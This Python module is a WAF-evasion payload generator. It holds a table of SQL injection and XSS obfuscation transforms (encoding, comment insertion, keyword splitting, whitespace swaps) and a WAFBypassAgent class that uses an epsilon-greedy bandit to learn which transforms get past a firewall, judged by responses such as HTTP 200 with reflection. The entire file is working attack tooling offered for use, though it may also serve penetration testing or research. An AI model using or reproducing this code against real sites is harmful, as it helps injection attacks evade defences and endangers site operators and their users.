from __future__ import annotations

import random
import re
from typing import Any, Callable

STRATEGIES: dict[str, Callable[[str, str], str]] = {
    "case_mutation": lambda p, ctx: (p.upper() if ctx == "sqli" else p.lower()),
    "comment_injection": lambda p, ctx: (
        re.sub(r"\s+", "/**/", p) if ctx == "sqli" else re.sub(r"\s+", "&#32;", p)
    ),
    "percent_encoding": lambda p, ctx: (
        p.replace(" ", "%20")
        .replace("'", "%27")
        .replace('"', "%22")
        .replace("--", "%2D%2D")
        if ctx == "sqli"
        else p.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20")
    ),
    "double_encoding": lambda p, ctx: (
        p.replace("'", "%2527").replace("--", "%252D%252D")
        if ctx == "sqli"
        else p.replace("<", "%253C").replace(">", "%253E")
    ),
    "whitespace_mutation": lambda p, ctx: (
        re.sub(r"\s+", "\t", p) if ctx == "sqli" else re.sub(r"\s+", "&#x0A;", p)
    ),
    "keyword_splitting": lambda p, ctx: (
        re.sub(
            r"(?i)\b(select|union|and|or|from|where)\b",
            lambda m: f"{m.group(1)[0]}/**/{m.group(1)[1:]}",
            p,
        )
        if ctx == "sqli"
        else re.sub(
            r"(?i)\b(script|alert|javascript)\b",
            lambda m: f"{m.group(1)[0]}&#x0A;{m.group(1)[1:]}",
            p,
        )
    ),
}


class WAFBypassAgent:
    """Reinforcement-learning-style WAF evasion payload generator.

    An epsilon-greedy bandit over obfuscation strategies. Rewards observed
    through ``observe_reward`` (e.g. HTTP 200 + reflection) are replayed to
    bias future payload selection toward strategies that worked.
    """

    def __init__(self, *, epsilon: float = 0.2, max_history: int = 256) -> None:
        self.epsilon = epsilon
        self.max_history = max_history
        self.replay: dict[str, list[float]] = {}
        self.history: list[dict[str, Any]] = []
        self._bootstrap_index = 0

    def generate_bypass_payload(
        self,
        base_payload: str,
        *,
        target: str | None = None,
        context: str = "sqli",
    ) -> dict[str, Any]:
        strategy = self._select_strategy()
        payload = self._apply(strategy, base_payload, context)
        self.history.append(
            {
                "target": target,
                "strategy": strategy,
                "context": context,
                "payload": payload,
                "reward": None,
            }
        )
        if len(self.history) > self.max_history:
            self.history = self.history[-self.max_history :]
        return {
            "payload": payload,
            "strategy": strategy,
            "attempts": len(self.history),
            "learned": bool(self.replay),
        }

    def observe_reward(self, reward: float) -> None:
        if not self.history:
            return
        entry = self.history[-1]
        entry["reward"] = reward
        strategy = str(entry["strategy"])
        bucket = self.replay.setdefault(strategy, [])
        bucket.append(reward)
        if len(bucket) > 64:
            self.replay[strategy] = bucket[-64:]

    def best_strategy(self) -> str | None:
        if not self.replay:
            return None
        return max(
            self.replay,
            key=lambda s: sum(self.replay[s]) / len(self.replay[s]),
        )

    def _select_strategy(self) -> str:
        names = list(STRATEGIES)
        if not self.replay:
            strategy = names[self._bootstrap_index % len(names)]
            self._bootstrap_index += 1
            return strategy
        if random.random() < self.epsilon:
            return random.choice(names)
        best = self.best_strategy()
        return best if best is not None else random.choice(names)

    def _apply(self, strategy: str, payload: str, context: str) -> str:
        fn = STRATEGIES.get(strategy)
        if fn is None:
            return payload
        try:
            return fn(payload, context)
        except Exception:
            return payload
